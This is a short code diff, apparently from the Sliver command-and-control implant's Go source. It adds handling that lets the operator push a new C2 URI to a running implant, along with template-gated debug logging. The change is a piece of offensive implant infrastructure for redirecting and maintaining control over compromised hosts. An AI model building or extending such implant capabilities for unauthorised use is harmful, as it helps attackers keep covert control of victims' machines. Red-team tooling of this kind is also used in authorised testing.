@@ -1351,6 +1351,12 @@ func reconfigureHandler(data []byte, resp RPCResponse) {
 	if reconfigReq.BeaconJitter != 0 {
 		transports.SetJitter(reconfigReq.BeaconJitter)
 	}
+	if reconfigReq.C2URI != "" {
+		// {{if .Config.Debug}}
+		log.Printf("[*] Received new C2 URI: %s", reconfigReq.C2URI)
+		// {{end}}
+		transports.SetC2URI(reconfigReq.C2URI)
+	}
 	// {{end}}
 
 	reconfigResp := &sliverpb.Reconfigure{}
